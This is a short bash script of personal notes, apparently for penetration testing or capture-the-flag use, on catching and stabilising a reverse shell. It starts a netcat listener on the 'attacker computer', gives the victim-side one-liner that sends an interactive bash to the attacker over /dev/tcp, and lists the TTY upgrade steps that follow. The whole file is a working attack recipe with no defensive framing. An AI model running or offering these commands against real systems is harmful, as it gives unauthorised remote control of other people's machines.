#!/bin/bash
export TTY
# shopt -s nullglob # use for 'for' loops but not for 'ls', 'grep'

# Run this on attacker computer with available port

# Before running, do as stty in case I need it. Or use tmux to get the
# dimensions

# This has to be run in bash. My zsh doesn't perform. stty problems.
nc -l 4444

# Run this command and then go to the victim computer and run "bash -c
# \"bash -i >& /dev/tcp/$remotehost/4444 0>&1\""
# then back here, in the nc, it should receive a bash.


# # Once connected, I can
# # In reverse shell
# python -c 'import pty; pty.spawn("/bin/bash")'
# OR:
# script /dev/null
# # Ctrl-Z
# 
# # In Kali
# stty raw -echo
# fg
# 
# # In reverse shell
# reset
# export SHELL=bash
# export TERM=xterm-256color
# stty rows <num> columns <cols>
